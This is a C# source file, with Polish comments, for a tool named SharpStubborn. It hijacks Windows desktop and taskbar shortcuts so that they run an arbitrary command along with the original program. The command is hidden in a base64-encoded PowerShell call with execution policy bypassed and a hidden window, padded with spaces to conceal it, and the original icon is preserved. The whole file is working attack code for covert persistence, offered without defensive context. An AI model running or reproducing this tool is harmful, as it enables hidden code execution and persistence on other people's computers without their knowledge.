using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using IWshRuntimeLibrary;

namespace DesktopShortcutsLister
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: SharpStubborn <lnk name> <Komenda do wykonania>");
                return;
            }
            Stubborn(args[0], args[1]);
        }

        public static void Stubborn(string skrot, string komenda)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string taskbarPath = @"C:\Users\piotr\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar";
;
            List<string> shortcutFiles = new List<string>();
            shortcutFiles.AddRange(Directory.GetFiles(desktopPath, "*.lnk"));
            shortcutFiles.AddRange(Directory.GetFiles(taskbarPath, "*.lnk"));

            string searchQuery = skrot;
            string cmd = komenda;

            // Znajdź pierwszy skrót, którego nazwa zawiera frazę, ignorując wielkość liter
            string foundShortcutPath = null;
            foreach (var filePath in shortcutFiles)
            {
                Console.WriteLine(filePath);
                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
                if (fileNameWithoutExtension.IndexOf(searchQuery, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    foundShortcutPath = filePath;
                    break;
                }
            }

            if (foundShortcutPath != null)
            {
                // Załaduj skrót, aby go zmodyfikować
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(foundShortcutPath);

                Console.WriteLine("Znaleziono skrót:");
                Console.WriteLine($"Nazwa: {Path.GetFileNameWithoutExtension(foundShortcutPath)}");
                Console.WriteLine($"Ścieżka docelowa: {shortcut.TargetPath}");
                Console.WriteLine($"Argumenty to: {shortcut.Arguments}");
                Console.WriteLine($"Ikonka to: {shortcut.IconLocation}");

                // Ustawienie ikonki - jezeli byla sciezka do ikonki to ja zostawiamy. Jezeli nie bylo - zostawiamy targetpath. W przeciwnym wypadku nadpisze nam ikonke Powershellem, a tego bysmy nie chcieli. 
                string oldlocation = shortcut.IconLocation;
                if (oldlocation.StartsWith(","))
                {
                    shortcut.IconLocation = shortcut.TargetPath;
                }
                else
                {
                    shortcut.IconLocation = oldlocation + ",0";
                }


                string newCmd;
                if (shortcut.Arguments.Length != 0)
                {
                    newCmd = "start-process " + "\"" + shortcut.TargetPath + " " + shortcut.Arguments.ToString() + "\"" + ";" + cmd;
                }
                else
                {
                    newCmd = "start-process " + "\"" + shortcut.TargetPath + "\"" + ";" + cmd;
                }

                byte[] newcmdBytes = Encoding.Unicode.GetBytes(newCmd);
                string encodednewCmd = Convert.ToBase64String(newcmdBytes);
                string newaArgument = " /c start /min \"\"".PadLeft(300) + " powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -e " + encodednewCmd;



                // Modyfikacja target path
                shortcut.TargetPath = "cmd.exe";
                shortcut.Arguments = newaArgument;
                Console.Write("Nowe polecenie to: " + shortcut.TargetPath + shortcut.Arguments + "\n");

                // Zapisanie skrótu
                shortcut.Save();

                Console.WriteLine("Ścieżka docelowa została zaktualizowana.");
            }
            else
            {
                Console.WriteLine("Nie znaleziono skrótu pasującego do zapytania.");
            }
        }
    }
}